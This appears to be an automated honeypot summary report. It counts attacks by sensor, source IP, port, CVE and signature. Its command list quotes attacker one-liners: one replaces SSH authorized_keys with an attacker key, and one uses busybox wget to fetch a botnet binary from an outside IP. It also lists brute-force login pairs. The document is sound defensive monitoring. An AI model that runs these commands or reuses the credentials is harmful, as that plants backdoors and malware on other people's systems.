# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-03T20:01:24Z
**Timeframe Covered:** 2025-10-03T19:20:01Z to 2025-10-03T20:00:01Z
**Log Files Used:**
- agg_log_20251003T192001Z.json
- agg_log_20251003T194001Z.json
- agg_log_20251003T200001Z.json

## Executive Summary

This report summarizes 11,755 malicious events captured by the honeypot network. The majority of attacks were recorded on the Cowrie (SSH/Telnet), Mailoney (SMTP), and Ciscoasa honeypots. A significant portion of the activity originated from IP address `176.65.141.117`. Attackers predominantly targeted services on ports 25 (SMTP), 22 (SSH), and 445 (SMB). Observed command execution attempts indicate a focus on system reconnaissance, disabling security measures by modifying SSH authorized keys, and downloading second-stage malware using tools like `wget` and `curl`. The most frequently triggered Suricata signature was related to sources listed on the Dshield blocklist.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 4881
- **Mailoney:** 2506
- **Ciscoasa:** 2087
- **Suricata:** 1235
- **Dionaea:** 439
- **Sentrypeer:** 297
- **Honeytrap:** 157
- **Adbhoney:** 38
- **H0neytr4p:** 45
- **Tanner:** 26
- **ConPot:** 17
- **Honeyaml:** 13
- **Redishoneypot:** 7
- **Dicompot:** 3
- **ElasticPot:** 2
- **Ipphoney:** 1
- **Miniprint:** 1

### Top Attacking IPs
- **176.65.141.117:** 1640
- **86.54.42.238:** 773
- **165.227.174.138:** 858
- **50.84.211.204:** 429
- **187.16.96.250:** 286
- **107.174.67.215:** 281
- **124.225.206.40:** 257
- **36.137.249.148:** 262
- **152.200.181.42:** 174
- **185.156.73.166:** 224
- **92.63.197.59:** 213
- **188.18.49.50:** 237
- **46.105.87.113:** 182
- **34.92.81.41:** 161

### Top Targeted Ports/Protocols
- **25:** 2506
- **22:** 637
- **445:** 407
- **5060:** 297
- **443:** 45
- **23:** 39
- **80:** 33
- **TCP/80:** 43
- **UDP/161:** 26

### Most Common CVEs
- **CVE-2002-0013 CVE-2002-0012:** 19
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 9
- **CVE-2021-3449 CVE-2021-3449:** 5
- **CVE-2019-11500 CVE-2019-11500:** 4
- **CVE-1999-0517:** 3

### Commands Attempted by Attackers
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys...`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh;...`
- `cd /data/local/tmp/; busybox wget http://...`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered
- **ET DROP Dshield Block Listed Source group 1:** 336
- **2402000:** 336
- **ET SCAN NMAP -sS window 1024:** 181
- **2009582:** 181
- **ET INFO Reserved Internal IP Traffic:** 57
- **2002752:** 57
- **ET CINS Active Threat Intelligence Poor Reputation IP group 50:** 31
- **ET CINS Active Threat Intelligence Poor Reputation IP group 51:** 28

### Users / Login Attempts
- **345gs5662d34/345gs5662d34:** 29
- **root/3245gs5662d34:** 19
- **root/nPSpP4PBW0:** 9
- **superadmin/admin123:** 6
- **root/LeitboGi0ro:** 7
- **root/2glehe5t24th1issZs:** 5
- **test/zhbjETuyMffoL8F:** 6

### Files Uploaded/Downloaded
- `wget.sh;`: 20
- `w.sh;`: 5
- `c.sh;`: 5
- `arm.urbotnetisass`: 2
- `arm5.urbotnetisass`: 2
- `arm6.urbotnetisass`: 2
- `arm7.urbotnetisass`: 2
- `x86_32.urbotnetisass`: 2
- `mips.urbotnetisass`: 2
- `mipsel.urbotnetisass`: 2

### HTTP User-Agents
- (No user agents recorded in this period)

### SSH Clients
- (No SSH clients recorded in this period)

### SSH Servers
- (No SSH servers recorded in this period)

### Top Attacker AS Organizations
- (No AS organizations recorded in this period)

## Key Observations and Anomalies

1.  **Credential Stuffing:** The repeated use of credentials like `345gs5662d34/345gs5662d34` across multiple source IPs suggests a coordinated or botnet-driven credential stuffing campaign.
2.  **Malware Delivery via Shell Scripts:** Attackers consistently use `wget` and `curl` to download shell scripts (`w.sh`, `c.sh`, `wget.sh`), which likely act as droppers for more sophisticated malware payloads.
3.  **Targeted Malware Payloads:** The attempt to download multiple `urbotnetisass` binaries compiled for different architectures (ARM, x86, MIPS) indicates an effort to infect a wide range of IoT devices and embedded systems.
4.  **SSH Key Manipulation:** A common tactic observed is the attempt to delete existing SSH configurations and install a new, attacker-controlled public key. This provides persistent backdoor access to the compromised system.
